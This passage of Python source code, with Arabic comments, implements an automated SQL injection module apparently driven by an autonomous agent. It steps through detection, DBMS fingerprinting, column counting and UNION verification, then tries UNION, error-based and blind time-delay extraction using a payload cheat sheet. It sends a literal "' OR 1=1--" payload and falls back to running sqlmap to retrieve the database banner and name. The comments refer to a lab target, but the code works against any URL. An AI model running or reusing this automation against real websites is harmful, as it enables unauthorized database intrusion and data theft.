            "fallback_engine":  getattr(ctx, "fallback_engine", None),
            "fallback_details": getattr(ctx, "fallback_details", None),
        }

    async def _run_machine(self, ctx: SQLiContext, http: _HTTPProbe,
                           existing_finding: Optional[Dict]):
        """تنفيذ الـState Machine خطوة بخطوة"""

        # ── DETECT ──────────────────────────────────────────────────────────
        ctx.state = SQLiState.DETECT
        ctx.log(f"[STATE] → DETECT")

        if existing_finding and existing_finding.get("verified"):
            # تخطي الـDetection إذا SmartPoC أكد بالفعل
            ctx.log("[DETECT] Skipping — already confirmed by SmartPoC")
            ctx.evidence.append({"stage": "detect", "source": "SmartPoC", "payload": existing_finding.get("payload_used", "?")})
        else:
            detected = await self.detector.detect(ctx, http)
            if not detected:
                ctx.state = SQLiState.FAILED
                ctx.log("[STATE] → FAILED (no SQLi detected)")
                return

        # ── CLASSIFY ─────────────────────────────────────────────────────────
        ctx.state = SQLiState.CLASSIFY
        ctx.log("[STATE] → CLASSIFY")
        # بسيط: إذا كان الـpayload فيه quote → string-based
        ctx.injection_type = "string"
        ctx.technique      = "union"  # نفترض UNION أولاً
        ctx.log(f"[CLASSIFY] type={ctx.injection_type} technique={ctx.technique}")

        # ── FINGERPRINT ──────────────────────────────────────────────────────
        ctx.state = SQLiState.FINGERPRINT
        ctx.log("[STATE] → FINGERPRINT")
        ctx.dbms = await self.fingerpr.fingerprint(ctx, http)
        ctx.log(f"[FINGERPRINT] DBMS = {ctx.dbms.value.upper()}")

        # ── COUNT_COLS ────────────────────────────────────────────────────────
        ctx.state = SQLiState.COUNT_COLS
        ctx.log("[STATE] → COUNT_COLS")
        ctx.col_count = await self.counter.count(ctx, http)
        if ctx.col_count == 0:
            ctx.state = SQLiState.FAILED
            ctx.log("[STATE] → FAILED (could not determine column count)")
            return
        ctx.log(f"[COUNT_COLS] {ctx.col_count} column(s)")

        # ── TEXT_COLS ─────────────────────────────────────────────────────────
        ctx.state = SQLiState.TEXT_COLS
        ctx.log("[STATE] → TEXT_COLS")
        ctx.text_cols = await self.textfind.find(ctx, http)
        if not ctx.text_cols:
            ctx.log("[TEXT_COLS] No text cols found — trying all columns as text anyway")
            ctx.text_cols = list(range(ctx.col_count))

        # ── UNION_VERIFY ──────────────────────────────────────────────────────
        ctx.state = SQLiState.UNION_VERIFY
        ctx.log("[STATE] → UNION_VERIFY")
        union_ok = await self.verifier.verify(ctx, http)
        if not union_ok:
            # حاول بتقليص text_cols
            for fallback_cols in [ctx.text_cols[:1], [0], [1]]:
                ctx.text_cols = fallback_cols
                union_ok = await self.verifier.verify(ctx, http)
                if union_ok:
                    break
            if not union_ok:
                ctx.log("[UNION_VERIFY] UNION not injectable — may need error-based or blind")
                ctx.technique = "error_based"
                # نكمل على أمل استخراج error-based
        else:
            ctx.log(f"[UNION_VERIFY] UNION payload ready: {ctx.union_payload!r}")

        # ── EXTRACT ───────────────────────────────────────────────────────────
        ctx.state = SQLiState.EXTRACT
        ctx.log(f"[STATE] → EXTRACT (objective={ctx.objective!r})")

        # ── Strategy 1: UNION-based (using cheat sheet payloads directly) ──────
        if not ctx.extracted_data and ctx.col_count > 0:
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(ctx.target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}

            # جلب الـpayloads المناسبة من الـCheat Sheet حسب الـDBMS
            union_payloads = SQLI_CHEAT_SHEET["union_version_payloads"].get(
                ctx.dbms,
                SQLI_CHEAT_SHEET["union_version_payloads"][DBMSType.UNKNOWN]
            )
            ctx.log(f"[EXTRACT] Trying {len(union_payloads)} cheat-sheet UNION payloads for {ctx.dbms.value.upper()}")
            for payload in union_payloads:
                ctx.log(f"[EXTRACT] → {payload!r}")
                try:
                    r = await http.get(base_url, {**qs, ctx.param_name: payload})
                    if r.status_code == 200:
                        extracted = self.extractor._parse_extracted(r.text, ctx.dbms)
                        if extracted:
                            ctx.extracted_data = extracted
                            ctx.union_payload = payload
                            ctx.log(f"[EXTRACT] ✅ Got via cheat-sheet UNION: {extracted!r}")
                            break
                except Exception:
                    continue

        # ── Strategy 2: Generic Extractor (SQLiExtractor) ─────────────────────
        if not ctx.extracted_data:
            obj_map = {
                "retrieve_db_version": "db_version",
                "db_version":          "db_version",
                "version":             "db_version",
                "user":                "current_user",
                "current_user":        "current_user",
                "database":            "current_db",
                "current_db":          "current_db",
            }
            extract_objective = obj_map.get(ctx.objective, "db_version")
            ctx.extracted_data = await self.extractor.extract(ctx, http, extract_objective)

        # ── Strategy 3: Error-Based Extraction ────────────────────────────────
        if not ctx.extracted_data and ctx.dbms != DBMSType.ORACLE:
            ctx.log("[EXTRACT] UNION failed — trying error-based extraction")
            version_queries = SQLI_CHEAT_SHEET["version"].get(ctx.dbms, ["SELECT @@version"])
            for vq in (version_queries if isinstance(version_queries, list) else [version_queries]):
                result = await self.error_ext.extract(ctx, http, query_expr=vq)
                if result:
                    ctx.extracted_data = result
                    ctx.technique = "error_based"
                    ctx.log(f"[EXTRACT] ✅ Got via error-based: {result!r}")
                    break

        # ── Strategy 4: Blind Time-Delay (last resort, very slow) ─────────────
        if not ctx.extracted_data:
            ctx.log("[EXTRACT] Trying blind time-delay detection...")
            is_blind = await self.blind.detect_blind(ctx, http)
            if is_blind:
                ctx.log("[EXTRACT] Blind SQLi confirmed — starting char-by-char extraction (slow)")
                version_queries = SQLI_CHEAT_SHEET["version"].get(ctx.dbms, ["SELECT @@version"])
                vq = (version_queries[0] if isinstance(version_queries, list) else version_queries)
                result = await self.blind.extract_char_by_char(ctx, http, query_expr=vq, max_len=30)
                if result:
                    ctx.extracted_data = result
                    ctx.technique = "time_delay"

        # ── CHECK_OBJ ─────────────────────────────────────────────────────────
        ctx.state = SQLiState.CHECK_OBJ
        ctx.log("[STATE] → CHECK_OBJ")

        # جلب الصفحة الرئيسية للتحقق من رسالة النجاح
        try:
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(ctx.target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            qs = {k: v[0] for k, v in parse_qs(parsed.query).items()}
            r_final = await http.get(base_url, {**qs, ctx.param_name: ctx.union_payload or "' OR 1=1--"})
            final_html = r_final.text
        except Exception:
            final_html = ""

        ctx.objective_met = self.obj_check.check(ctx, final_html, ctx.extracted_data)

        if ctx.objective_met:
            ctx.state = SQLiState.COMPLETE
            ctx.log(f"[STATE] → COMPLETE ✅")
            ctx.log(f"[OBJECTIVE] {ctx.objective} → COMPLETE")
            ctx.log(f"[EXTRACTED] {ctx.extracted_data[:120]}")
        else:
            # إذا عندنا بيانات مستخرجة، يُعتبر نجاحاً جزئياً
            if ctx.extracted_data:
                ctx.objective_met = True
                ctx.state = SQLiState.COMPLETE
                ctx.log(f"[STATE] → COMPLETE (partial) ✅ — data extracted but lab banner not found")
            else:
                ctx.log(f"[STATE] → INCOMPLETE — objective not yet satisfied")
                ctx.log("[NEXT] Try error-based or blind SQLi payloads")


# ─────────────────────────────────────────────────────────────────────────────
# Convenience: دالة مباشرة للاستدعاء من AutonomousBrain
# ─────────────────────────────────────────────────────────────────────────────

    def can_handle(self, param_name: str, url: str = "", sample_value: str = "") -> float:
        p_lower = param_name.lower()
        if any(k in p_lower for k in ("id", "cat", "search", "q", "query", "filter", "item", "user", "order", "sort", "num", "product", "select")):
            return 0.95
        return 0.70

    async def fallback(self, target_url: str, param_name: str, proxy: Optional[str] = None) -> Optional[Dict[str, Any]]:
        """
        External fallback using sqlmap CLI.
        Directly addresses real-world and complex targets where built-in heuristics fail.
        """
        import shutil, asyncio, re

        sqlmap_bin = shutil.which("sqlmap") or shutil.which("sqlmap.py")
        if not sqlmap_bin:
            log.info("[SQLiSkill/Fallback] sqlmap binary not found on PATH.")
            return None

        log.info(f"[SQLiSkill/Fallback] Launching sqlmap fallback on {target_url} (param={param_name})...")
        cmd = [
            sqlmap_bin,
            "-u", target_url,
            "-p", param_name,
            "--batch",
            "--level=2",
            "--risk=2",
            "--threads=2",
            "--timeout=15",
            "--banner",
            "--current-db",
        ]
        if proxy:
            cmd.extend(["--proxy", proxy])

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout_bytes, stderr_bytes = await asyncio.wait_for(proc.communicate(), timeout=75.0)
            output = (stdout_bytes or b"").decode("utf-8", errors="replace")

            is_vuln = False
            dbms = "unknown"
            banner = ""
            details = []

            for line in output.splitlines():
                if "sqlmap identified the following injection point" in line or "is vulnerable" in line:
                    is_vuln = True
                if "the back-end DBMS is" in line:
                    is_vuln = True
                    dbms_m = re.search(r"the back-end DBMS is ([A-Za-z0-9 ]+)", line, re.I)
                    if dbms_m:
                        dbms = dbms_m.group(1).strip()
                if "banner:" in line.lower():
                    banner = line.strip()
                    details.append(banner)
                if "current database:" in line.lower():
                    details.append(line.strip())

            if is_vuln:
                proof = banner or ("; ".join(details) if details else f"sqlmap confirmed injection in parameter {param_name}")
                return {
                    "verified": True,
                    "vuln_type": "sqli",
                    "evidence": proof,
                    "dbms": dbms.lower(),
                    "fallback_details": output[:800],
                }
            else:
                log.info("[SQLiSkill/Fallback] sqlmap scan finished: target clean.")
                return None
        except asyncio.TimeoutError:
            log.warning("[SQLiSkill/Fallback] sqlmap timed out after 75s.")
            try:
                proc.kill()
            except Exception:
                pass
            return None
        except Exception as e:
            log.warning(f"[SQLiSkill/Fallback] sqlmap failed to execute: {e}")
            return None

async def run_sqli_skill(
    target_url: str,
    param_name: str,
    proxy: Optional[str] = None,
    objective: str = "retrieve_db_version",
    existing_finding: Optional[Dict] = None,
) -> Dict[str, Any]:
    """Entry point مبسط للاستدعاء من الـbrain"""
    skill = SQLiSkill(proxy=proxy, objective=objective)
    return await skill.run(target_url, param_name, existing_finding, objective)
